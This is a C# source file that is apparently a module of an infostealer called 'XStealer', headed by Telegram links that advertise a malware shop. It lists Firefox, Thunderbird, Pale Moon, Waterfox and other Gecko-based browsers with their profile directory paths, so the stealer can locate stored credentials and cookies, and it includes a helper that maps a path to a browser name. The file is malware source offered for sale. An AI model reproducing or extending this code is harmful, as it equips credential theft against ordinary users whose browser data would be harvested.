// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Gecko
{
    using System.Collections.Generic;
    using System.Linq;

    public static class GBrowserPaths
    {
        #region Static paths to browsers | Пути к браузерам по статик путям

        /// <summary>
        /// Список браузеров которые находит ( можно дополнить если какой-то unknown неизвестный )
        /// </summary>
        public static readonly KeyValuePair<string, string>[] List = new KeyValuePair<string, string>[]
        {
            new KeyValuePair<string, string>("Firefox", "Firefox"),
            new KeyValuePair<string, string>("Mozilla", "Mozilla"),
            new KeyValuePair<string, string>("IceDragon", "IceDragon"),
            new KeyValuePair<string, string>("Comodo" , "Comodo_Dragon"),
            new KeyValuePair<string, string>("Moonchild" , "Pale_Moon"),
            new KeyValuePair<string, string>("Waterfox" , "Waterfox"),
            new KeyValuePair<string, string>("Thunderbird" , "Thunderbird"),
            new KeyValuePair<string, string>("8pecxstudios" , "Cyberfox"),
            new KeyValuePair<string, string>("NETGATE Technologies" , "NETGATE_BlackHaw"),
        };

        /// <summary>
        /// Список статических путей до Gecko браузеров
        /// </summary>
        public static readonly string[] GeckoPaths = new string[9]
        {
            @"\Mozilla\Firefox",
            @"\Comodo\IceDragon",
            @"\Mozilla\SeaMonkey",
            @"\Moonchild Productions\Pale Moon",
            @"\Waterfox",
            @"\K-Meleon",
            @"\Thunderbird",
            @"\8pecxstudios\Cyberfox",
            @"\NETGATE Technologies\BlackHaw",
        };

        /// <summary>
        /// Получения имени браузера из списка
        /// </summary>
        /// <param name="path"></param>
        /// <returns></returns>
        public static string GetName(string path)
        {
            try
            {
                foreach (KeyValuePair<string, string> v in List.Where(v => path.Contains(v.Key)).Select(v => v))
                {
                    return v.Value;
                }
            }
            catch { }
            return path ?? path.Split('\\')[1];
        }
        #endregion
    }
}